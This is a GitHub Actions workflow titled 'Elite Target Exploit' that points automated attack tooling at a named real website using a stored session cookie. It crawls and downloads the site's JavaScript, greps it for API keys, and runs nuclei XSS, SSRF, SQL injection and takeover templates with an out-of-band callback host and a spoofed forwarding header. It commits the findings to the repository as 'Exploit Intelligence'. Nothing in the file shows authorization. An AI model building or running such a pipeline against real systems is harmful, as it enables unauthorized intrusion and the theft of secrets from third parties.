name: "Elite Target Exploit â€” REPAIRED"

on:
  workflow_dispatch:

permissions:
  contents: write
  issues: write

env:
  TARGET_URL: "https://academy.openai.com/?amp=test"
  AUTH_COOKIE: ${{ secrets.OPENAI_COOKIE }}

jobs:
  exploit:
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      matrix:
        # Optimized tags that actually exist in the 2026 template library
        vuln_type: [cve2025, cve2026, xss, ssrf, sqli, takeover]

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Arsenal
        run: |
          go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
          go install github.com/projectdiscovery/katana/cmd/katana@latest
          pip install njsscan
          echo "$(go env GOPATH)/bin" >> $GITHUB_PATH

      - name: ðŸ› ï¸ Setup Templates
        run: nuclei -ut # Ensures templates are fresh and paths are correct

      - name: ðŸ“‚ Step 1:Code Extraction (Fixed Pathing)
        run: |
          mkdir -p ./source_code/raw
          # Using -d 3 to go deeper into the academy site
          katana -u "$TARGET_URL" -jc -d 3 -em js,json -o ./source_code/endpoints.txt || touch ./source_code/endpoints.txt
          
          if [ -s ./source_code/endpoints.txt ]; then
            # Download first 50 discovered files
            head -n 50 ./source_code/endpoints.txt | xargs -I % wget -q -P ./source_code/raw/ % || true
          fi

      - name: ðŸ” Step 2:Secret & SAST Scan
        run: |
          # Only run if directory exists and isn't empty
          if [ "$(ls -A ./source_code/raw/)" ]; then
            njsscan ./source_code/raw/ --sarif -o sast_report.sarif || true
            grep -rE "sk-[a-zA-Z0-9]{32,}|ai_[a-zA-Z0-9_\-]{20,}" ./source_code/raw/ > discovered_secrets.txt || true
          else
            echo "No JS files found to analyze." > discovered_secrets.txt
          fi

      - name: ðŸ›¡ï¸ Step 3:Header Injection (Updated Path)
        run: |
          # Using the generic 'fuzzing' and 'injection' tags instead of broken file paths
          nuclei -u "$TARGET_URL" \
            -tags xss,ssrf,generic-injection \
            -header "Cookie: $AUTH_COOKIE" \
            -header "X-Forwarded-Host: exploit.oast.fun" \
            -interactsh-server oast.fun \
            -o header_exploits.txt || true

      - name: â˜¢ï¸ Step 4:High-Intensity Scan (Fixed Tags)
        run: |
          # Removed the '-dast' flag because it limits template selection too strictly
          nuclei -u "$TARGET_URL" \
            -tags ${{ matrix.vuln_type }} \
            -header "Cookie: $AUTH_COOKIE" \
            -severity critical,high,medium \
            -rl 50 -bs 25 \
            -o nuclei_results.txt

      - name: ðŸ’¾ Step 5:Secure Result Sync
        if: always()
        run: |
          git config --local user.email "bot@hacker.ai"
          git config --local user.name "Exploit-Bot"
          
          for i in {1..10}; do
            git pull origin main --rebase
            mkdir -p "findings/${{ matrix.vuln_type }}"
            cp *.txt "findings/${{ matrix.vuln_type }}/" 2>/dev/null || true
            git add findings/
            git commit -m "Exploit Intelligence: ${{ matrix.vuln_type }}" && git push origin main && break || sleep 10
          done
          
